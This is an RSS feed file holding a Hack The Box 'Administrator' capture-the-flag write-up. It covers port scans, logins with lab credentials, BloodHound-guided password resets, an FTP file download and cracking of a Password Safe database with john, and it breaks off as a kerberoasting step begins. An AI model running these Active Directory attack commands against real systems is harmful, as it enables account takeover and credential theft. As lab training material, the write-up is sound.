@@ -1,0 +1,1195 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Writeups on SolarSpectre</title><link>https://solarspectre.github.io/categories/writeups/</link><description>Recent content in Writeups on SolarSpectre</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 01 Apr 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://solarspectre.github.io/categories/writeups/index.xml" rel="self" type="application/rss+xml"/><item><title>HTB Administrator - Writeup</title><link>https://solarspectre.github.io/p/htb-administrator-writeup/</link><pubDate>Tue, 01 Apr 2025 00:00:00 +0000</pubDate><guid>https://solarspectre.github.io/p/htb-administrator-writeup/</guid><description>&lt;img src="https://solarspectre.github.io/p/htb-administrator-writeup/cover.jpg" alt="Featured image of post HTB Administrator - Writeup" /&gt;&lt;h3 id="enumeration"&gt;Enumeration
+&lt;/h3&gt;&lt;p&gt;Let&amp;rsquo;s start with a scan to all ports:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo nmap -sS -p- --open --min-rate &lt;span class="m"&gt;5000&lt;/span&gt; -vvv -n -Pn 10.10.11.61 -oG allPorts
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Here are the open ports&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;PORT STATE SERVICE REASON
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;21/tcp open ftp syn-ack ttl &lt;span class="m"&gt;127&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;53/tcp open domain syn-ack ttl &lt;span class="m"&gt;127&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;88/tcp open kerberos-sec syn-ack ttl &lt;span class="m"&gt;127&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;135/tcp open msrpc syn-ack ttl &lt;span class="m"&gt;127&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;139/tcp open netbios-ssn syn-ack ttl &lt;span class="m"&gt;127&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;389/tcp open ldap syn-ack ttl &lt;span class="m"&gt;127&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;445/tcp open microsoft-ds syn-ack ttl &lt;span class="m"&gt;127&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;464/tcp open kpasswd5 syn-ack ttl &lt;span class="m"&gt;127&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;593/tcp open http-rpc-epmap syn-ack ttl &lt;span class="m"&gt;127&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;636/tcp open ldapssl syn-ack ttl &lt;span class="m"&gt;127&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;3268/tcp open globalcatLDAP syn-ack ttl &lt;span class="m"&gt;127&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;3269/tcp open globalcatLDAPssl syn-ack ttl &lt;span class="m"&gt;127&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;5985/tcp open wsman syn-ack ttl &lt;span class="m"&gt;127&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;9389/tcp open adws syn-ack ttl &lt;span class="m"&gt;127&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;47001/tcp open winrm syn-ack ttl &lt;span class="m"&gt;127&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;once it&amp;rsquo;s finished, grep the ports and copy them to later scan them with nmap looking out for the versions of the services hosted.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;span class="lnt"&gt;22
+&lt;/span&gt;&lt;span class="lnt"&gt;23
+&lt;/span&gt;&lt;span class="lnt"&gt;24
+&lt;/span&gt;&lt;span class="lnt"&gt;25
+&lt;/span&gt;&lt;span class="lnt"&gt;26
+&lt;/span&gt;&lt;span class="lnt"&gt;27
+&lt;/span&gt;&lt;span class="lnt"&gt;28
+&lt;/span&gt;&lt;span class="lnt"&gt;29
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo nmap -sC -sV -p21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 10.10.11.42 -oN targeted
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Starting Nmap 7.95 &lt;span class="o"&gt;(&lt;/span&gt; https://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at 2025-04-11 16:52 EDT
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Nmap scan report &lt;span class="k"&gt;for&lt;/span&gt; 10.10.11.42
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Host is up &lt;span class="o"&gt;(&lt;/span&gt;0.26s latency&lt;span class="o"&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;PORT STATE SERVICE VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;21/tcp open ftp Microsoft ftpd
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; ftp-syst:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_ SYST: Windows_NT
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;53/tcp open domain Simple DNS Plus
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;88/tcp open kerberos-sec Microsoft Windows Kerberos &lt;span class="o"&gt;(&lt;/span&gt;server time: 2025-04-12 03:52:41Z&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;135/tcp open msrpc Microsoft Windows RPC
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;389/tcp open ldap Microsoft Windows Active Directory LDAP &lt;span class="o"&gt;(&lt;/span&gt;Domain: administrator.htb0., Site: Default-First-Site-Name&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;445/tcp open microsoft-ds?
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;464/tcp open kpasswd5?
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;636/tcp open tcpwrapped
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;3268/tcp open ldap Microsoft Windows Active Directory LDAP &lt;span class="o"&gt;(&lt;/span&gt;Domain: administrator.htb0., Site: Default-First-Site-Name&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;3269/tcp open tcpwrapped
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;5985/tcp open http Microsoft HTTPAPI httpd 2.0 &lt;span class="o"&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_http-server-header: Microsoft-HTTPAPI/2.0
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_http-title: Not Found
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;9389/tcp open mc-nmf .NET Message Framing
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;47001/tcp open http Microsoft HTTPAPI httpd 2.0 &lt;span class="o"&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_http-server-header: Microsoft-HTTPAPI/2.0
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_http-title: Not Found
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Service Info: Host: DC&lt;span class="p"&gt;;&lt;/span&gt; OS: Windows&lt;span class="p"&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;add the domain to your /etc/hosts file&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;10.10.11.61 administrator.htb dc.administrator.htb
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Run netexec with the credentials from hackthebox&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;nxc winrm 10.10.11.42 -u Olivia -p ichliebedich
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;WINRM 10.10.11.42 &lt;span class="m"&gt;5985&lt;/span&gt; DC &lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; administrator.htb&lt;span class="se"&gt;\o&lt;/span&gt;livia:ichliebedich &lt;span class="o"&gt;(&lt;/span&gt;Pwn3d!&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Login to the machine using evil-winrm and run SharpHound to look for Attack paths&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;evil-winrm -i 10.10.11.42 -u olivia -p &lt;span class="s1"&gt;&amp;#39;ichliebedich&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;upload SharpHound.exe
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Once you ingested the data in bloodhound, you can see that olivia has GenericAll meaning she has full control over michael&amp;rsquo;s account&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-administrator-writeup/1.png"
+width="768"
+height="193"
+srcset="https://solarspectre.github.io/p/htb-administrator-writeup/1_hu_5452d1cb76675978.png 480w, https://solarspectre.github.io/p/htb-administrator-writeup/1_hu_aff7a081dde9a9c1.png 1024w"
+loading="lazy"
+alt="Image 1"
+class="gallery-image"
+data-flex-grow="397"
+data-flex-basis="955px"
+&gt;
+And Michael Can ForceChangePassword of Benjamin&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-administrator-writeup/2.png"
+width="768"
+height="164"
+srcset="https://solarspectre.github.io/p/htb-administrator-writeup/2_hu_7b78de711b72a0e2.png 480w, https://solarspectre.github.io/p/htb-administrator-writeup/2_hu_67524f6fadb9ffaf.png 1024w"
+loading="lazy"
+alt="Image 2"
+class="gallery-image"
+data-flex-grow="468"
+data-flex-basis="1123px"
+&gt;
+To reset the password for these users you can use this commands&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;net rpc password &lt;span class="s2"&gt;&amp;#34;michael&amp;#34;&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;P@ssw00rd!231!!!&amp;#39;&lt;/span&gt; -U &lt;span class="s2"&gt;&amp;#34;administrator.htb&amp;#34;&lt;/span&gt;/&lt;span class="s2"&gt;&amp;#34;Olivia&amp;#34;&lt;/span&gt;%&lt;span class="s1"&gt;&amp;#39;ichliebedich&amp;#39;&lt;/span&gt; -S dc.administrator.htb
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;net rpc password &lt;span class="s2"&gt;&amp;#34;benjamin&amp;#34;&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;P@ssw00rd!555!!!&amp;#39;&lt;/span&gt; -U &lt;span class="s2"&gt;&amp;#34;administrator.htb&amp;#34;&lt;/span&gt;/&lt;span class="s2"&gt;&amp;#34;michael&amp;#34;&lt;/span&gt;%&lt;span class="s1"&gt;&amp;#39;P@ssw00rd!231!!!&amp;#39;&lt;/span&gt; -S dc.administrator.htb
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id="user-flag"&gt;User Flag
+&lt;/h3&gt;&lt;p&gt;With these accounts you can look for access to other services like smb or ftp&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;span class="lnt"&gt;5
+&lt;/span&gt;&lt;span class="lnt"&gt;6
+&lt;/span&gt;&lt;span class="lnt"&gt;7
+&lt;/span&gt;&lt;span class="lnt"&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;nxc ftp 10.10.11.42 -u benjamin -p &lt;span class="s1"&gt;&amp;#39;P@ssw00rd!555!!!&amp;#39;&lt;/span&gt; --ls
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;FTP 10.10.11.42 &lt;span class="m"&gt;21&lt;/span&gt; 10.10.11.42 &lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Banner: Microsoft FTP Service
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;FTP 10.10.11.42 &lt;span class="m"&gt;21&lt;/span&gt; 10.10.11.42 &lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; benjamin:P@ssw00rd!555!!!
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;FTP 10.10.11.42 &lt;span class="m"&gt;21&lt;/span&gt; 10.10.11.42 &lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Directory Listing
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;FTP 10.10.11.42 &lt;span class="m"&gt;21&lt;/span&gt; 10.10.11.42 10-05-24 09:13AM &lt;span class="m"&gt;952&lt;/span&gt; Backup.psafe3
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;nxc ftp 10.10.11.42 -u benjamin -p &lt;span class="s1"&gt;&amp;#39;P@ssw00rd!555!!!&amp;#39;&lt;/span&gt; --get Backup.psafe3
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;this is a password database file that&amp;rsquo;s protected by a master password, to crack that password you can use john the ripper&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;span class="lnt"&gt;5
+&lt;/span&gt;&lt;span class="lnt"&gt;6
+&lt;/span&gt;&lt;span class="lnt"&gt;7
+&lt;/span&gt;&lt;span class="lnt"&gt;8
+&lt;/span&gt;&lt;span class="lnt"&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;pwsafe2john Backup.psafe3 &amp;gt; psafe3.hash
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;john psafe3.hash --wordlist&lt;span class="o"&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Using default input encoding: UTF-8
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Loaded &lt;span class="m"&gt;1&lt;/span&gt; password &lt;span class="nb"&gt;hash&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;pwsafe, Password Safe &lt;span class="o"&gt;[&lt;/span&gt;SHA256 256/256 AVX2 8x&lt;span class="o"&gt;])&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Cost &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;iteration count&lt;span class="o"&gt;)&lt;/span&gt; is &lt;span class="m"&gt;2048&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; all loaded hashes
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Will run &lt;span class="m"&gt;2&lt;/span&gt; OpenMP threads
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Press &lt;span class="s1"&gt;&amp;#39;q&amp;#39;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class="k"&gt;for&lt;/span&gt; status
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;tekieromucho &lt;span class="o"&gt;(&lt;/span&gt;Backu&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;with this password, open the database with passwordsafe&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo apt install passwordsafe
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;pwsafe Backup.psafe3
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;you can login as emily with evil-winrm&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;evil-winrm -i 10.10.11.42 -u emily -p PASSWORD
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;*Evil-WinRM* PS C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\e&lt;/span&gt;mily&lt;span class="se"&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class="nb"&gt;type&lt;/span&gt; user.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;XXXXXXXXXXXXXXXXXXXXXXXXXXX
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id="root-flag"&gt;Root Flag
+&lt;/h3&gt;&lt;p&gt;Looking for attack paths as emily in bloodhound you can find that she has GenericWrite access on Ethan&amp;rsquo;s account, which means we can use this to do a targeted kerberoast attack to obtain the hash of ethan&amp;rsquo;s account and crack it with johntheripper&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-administrator-writeup/3.png"
+width="768"
+height="201"
+srcset="https://solarspectre.github.io/p/htb-administrator-writeup/3_hu_c44c08755ace5602.png 480w, https://solarspectre.github.io/p/htb-administrator-writeup/3_hu_6c4b917d3779a5.png 1024w"
+loading="lazy"
+alt="Image 3"
+class="gallery-image"
+data-flex-grow="382"
